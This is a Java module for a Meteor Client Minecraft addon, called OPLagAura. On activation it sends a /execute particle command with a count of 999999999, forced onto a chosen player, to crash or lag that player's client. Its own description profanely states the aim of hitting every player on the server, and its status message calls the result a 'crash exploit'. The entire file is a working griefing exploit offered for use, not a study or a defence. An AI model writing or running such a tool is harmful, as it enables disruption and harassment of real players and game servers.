package dev.abstr3act.addon.modules.Seraphim;

import dev.abstr3act.addon.Compassion;
import dev.abstr3act.addon.command.ForceTargetCommand;
import dev.abstr3act.addon.module.SeraphimModule;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting.Builder;
import meteordevelopment.meteorclient.utils.player.ChatUtils;

public class OPLagAura extends SeraphimModule {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    public final Setting<String> command = this.sgGeneral
        .add(
            ((Builder) ((Builder) ((Builder) new Builder().name("Command")).description(""))
                .defaultValue("/execute at %t run particle minecraft:wax_off ~ ~ ~ ~ ~ ~ 10 999999999 force %t"))
                .build()
        );
    public final Setting<String> target = this.sgGeneral
        .add(((Builder) ((Builder) ((Builder) new Builder().name("Target")).description("")).defaultValue("NoStrict")).build());

    public OPLagAura() {
        super(Compassion.ABNORMALLY, "OPLagAura", "Use /particle to fuck all the player in the server");
    }

    public void onActivate() {
        String targetName = ForceTargetCommand.target != null ? ForceTargetCommand.target.getGameProfile().getName() : (String) this.target.get();
        ChatUtils.sendPlayerMsg(((String) this.command.get()).replace("%t", targetName));
        this.toggle("Successfully send crash exploit to " + targetName);
    }
}
